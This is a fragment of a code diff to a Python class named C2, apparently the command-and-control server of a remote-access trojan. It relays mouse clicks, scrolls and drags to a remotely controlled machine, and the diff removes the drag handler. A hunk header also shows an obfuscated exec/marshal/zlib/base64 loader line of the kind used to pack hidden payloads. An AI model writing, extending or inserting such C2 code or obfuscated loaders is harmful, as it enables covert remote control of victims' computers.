@@ -42,7 +42,6 @@ class C2:
         self.sio.on("mouse_click", self.mouse_click)
         self.sio.on("mouse_click_right", self.mouse_click_right)
         self.sio.on("mouse_scroll", self.mouse_scroll)
-        self.sio.on("mouse_drag", self.mouse_drag)
 
         print(f"Current time: {datetime.datetime.utcnow()}")
 
@@ -372,6 +371,3 @@ exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.
     
     def mouse_scroll(self, sid, data):
         self.sio.emit("mouse_scroll", data)
-
-    def mouse_drag(self, sid, data):
-        self.sio.emit("mouse_drag", data)
